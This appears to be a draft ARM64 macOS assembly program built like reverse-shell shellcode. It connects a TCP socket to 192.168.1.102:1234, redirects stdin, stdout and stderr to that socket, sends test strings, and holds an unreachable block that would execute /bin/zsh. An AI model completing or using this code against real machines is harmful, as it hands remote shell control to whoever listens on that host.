.global _main
.align 4




_main:

    bl      _read
    bl      _print
    bl      _print
    adrp    X5, msg@page
    add     X5, X5, msg@pageoff
    ldr     X20, [X5]
    ;mov     X5, #0
   ; add     X5, X5, #49
    cmp     X20, #0x37
    b.cs    _start
    b       _main

_start:
; socket descriptor
    mov     X0, #2  ; domain = PF_INET
    mov     X1, #1 ; type = SOCk_stream
    mov     X2, XZR ; protocol = IPPROTO_IP
    mov     X16, #97 ; BSD syscall 97 for socket
    svc     #0xffff ; execute syscall
    mov     X19, X0 ; save socket descriptor

    ; connect socket to local address 192.168.1.102

   ; mov     X2, #16 ; address_len = 16 bytes
    mov     X3, #0x0200 ; sin_len = 0 , sin_family = 2
    movk    X3, #0xD204, lsl#16 ; sin_port = 1234 = 0x04D2 (big endian for TCP/IP)
    movk    X3, #0xA8C0, lsl#32 ; move IP address 192.168.1.102
    movk    X3, #0x6801, lsl#48 ; ... (big endian)
    stp     X3, XZR, [SP, #-16]! ; push sockaddr_in in stack
    add     X1, SP, XZR ; pointer to sockaddr_in struct
   ; mov     X1, SP ; pointer to sockaddr_in structure
    mov     X2, #16 ; length of sockaddr_in bytes
    mov     X16, #98 ; BSD system call for connect
    svc     #0xffff ; execute syscall
    
   
    ; duplicate file descriptors STDIN , STDOUT, STDERR

    mov     X0, X19 ; restore socket descriptor to X0
    mov     X16, #90 ; BSD syscall 90 for dup2
    mov     X1, #2 ; file descriptor 2 = STDERR
    svc     #0xffff ; execute syscall
    mov     X0, X19 ; restore new socket descriptor 
    mov     X1, #1 ; file descriptor 1 = StdOut
    svc     #0xffff ; execute syscall
    mov     X0, X19 ; restore new socket descriptor
    mov     X1, XZR ; file descriptor 0 = STDIN
   ; lsr     X1, X1, #1 ; file descriptor 0 = STDIN
    svc     #0xffff ; execute syscall


    ; sendmsg

    mov     X0, X19 ; restore socket
    mov     X16, #133 ; syscall sendto
    adr 	X1, helloworld 
   
    mov     X2, #14
    mov     X3, XZR
    mov     X4, XZR
    mov     X5, #16
    svc     #0xffff ; execute syscall

    mov     X17, XZR

_loop:
    cmp     X17, #7
    b.cs    _end_loop
    bl      _sendto
    add     X17, X17, #1
    b       _loop
_end_loop:

    mov     X0, X19
    mov     X16, #6
    svc     #0xffff ; execute syscall

    ret


    ; launch shell via execve

    mov     X3, #0x622F ; move "/bin/zsh" into X3 (little endian) in four moves
    movk    X3, #0x6E69, lsl#16
    movk    X3, #0x7A2F, lsl#32
    movk    X3, #0x6873, lsl#48

    stp     X3, XZR, [SP, #-16]! ; push path and terminating 0 to stack
    mov     X0, SP ; save pointer to argv[0]
    stp     X0, XZR, [SP, #-16]! ; push argv[0] and terminating 0 to stack
    mov     X1, SP ; move pointer to argument into X1
    mov     X2, XZR ; third argument for execve
    mov     X16, #59 ; BSD syscall 59 for execve
    svc     #0xffff ; execute syscall



    


_sendto:


    mov     X0, X19 ; restore socket
    mov     X16, #133 ; syscall sendto
    adr     X1, test
    
   ; add     X1, X1, #8
    mov     X2, #8
    mov     X3, XZR
    mov     X4, XZR
    mov     X5, #16
    svc     #0xffff ; execute syscall
    
    ret


_sendto2:


    mov     X0, X19 ; restore socket
    mov     X16, #133 ; syscall sendto
    adr     X1, test2
    
   ; add     X1, X1, #8
    mov     X2, #8
    mov     X3, XZR
    mov     X4, XZR
    mov     X5, #16
    svc     #0xffff ; execute syscall
    ret

_print: 


       ; str LR, [SP, #-16]!     
        adrp    X1, msg@page        
        add     X1, X1, msg@pageoff    

        mov X0, #1     
       
        mov X16, #4     
        svc #0xffff     
        
       ; ldr LR, [SP], #16    

        ret

_read:
    str     LR, [SP, #-16]!
    mov     X0, #0
    adrp    X1, msg@page
    add     X1, X1, msg@pageoff
    
   ; ldr     X1, [X1]
    mov     X2, #1
    mov     X16, #3
    svc     #0xffff

    ldr     LR, [SP], #16
   
    ret





_finloop:
mov     X0, #0		// Use 0 return code
	mov     X16, #1		// System call number 1 terminates this program
	svc     #0

.data
msg: .ds 1

.text

helloworld:      .ascii  "\nHello World!\n"
test:      .ascii  "\nTest!\n"
test2:      .ascii  "\nTest2!\n"